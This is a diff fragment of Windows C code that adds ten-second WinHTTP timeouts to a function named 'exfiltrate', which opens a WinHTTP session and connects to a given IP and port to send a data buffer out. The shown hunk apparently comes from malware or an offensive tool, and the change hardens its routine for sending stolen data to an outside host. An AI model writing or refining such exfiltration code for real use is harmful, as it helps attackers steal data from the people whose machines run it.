@@ -30,6 +30,10 @@ static BOOL exfiltrate(const char *ip, WORD port, const char *data, DWORD len) {
                                      WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
     if (!hSession) return FALSE;
 
+    // Set timeouts (10s resolve, 10s connect, 10s send, 10s receive)
+    DWORD timeout_ms = 10000;
+    WinHttpSetTimeouts(hSession, timeout_ms, timeout_ms, timeout_ms, timeout_ms);
+
     HINTERNET hConn = WinHttpConnect(hSession, wip, port, 0);
     if (!hConn) { WinHttpCloseHandle(hSession); return FALSE; }
 
